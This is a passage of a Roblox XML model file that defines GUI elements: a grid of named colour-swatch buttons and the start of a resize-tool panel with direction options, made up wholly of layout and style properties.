											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXFDB6561819AA41C78B77EEB20A21B87A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4284622289</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Royal purple</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXA8128A85FAFC4CD2AE0F075836BF28DA">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4290019583</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Alder</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXB94578BE3D0C405A8487ECADC9DF84F2">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278497260</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Cyan</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX53776DD2F0254F6A95CA2C3D59100FCB">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4290040548</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Light blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXEAB59B3C31434B9E8E999E1AB9F92CCE">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4282023189</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Camo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX815EF6A0588C4C5ABC07F61D339EE667">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4285087784</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Reddish brown</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX8514CF17628840FEB2B104E56F70E71A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4289352960</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">CGA brown</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXBEF421DBAAAC460294E4F3F0E00B2E8B">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4288891723</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Dusty Rose</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX65A8F79EAA76431FB3425FE99E550AD6">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4289331370</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Magenta</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXE251E26118DC4DBF971C1577CCC5C667">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4280374457</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Deep blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXE812B900577C43FBBF3CAD93AED0229A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278198368</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Navy blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX1F56546D4655454BA6BB59B5244412D9">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4280844103</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Dark green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX40182194C2654BE4ACA9B6CBA513759A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4280763949</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Earth green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>180</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX93CBD063CEB7417E9CC17A9A5A41A6CC">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTResizeToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>280</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>245</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX383648B561C5438E899D03491B8D1D52">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">DirectionsOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXA4F054AA09F74FE8A0D0F1D167157AE4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Normal</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX74DE4F3277D449558769AE0E1B0E77B6">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBXC79BD94235BE4FD5BD4F488C798F53EF">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
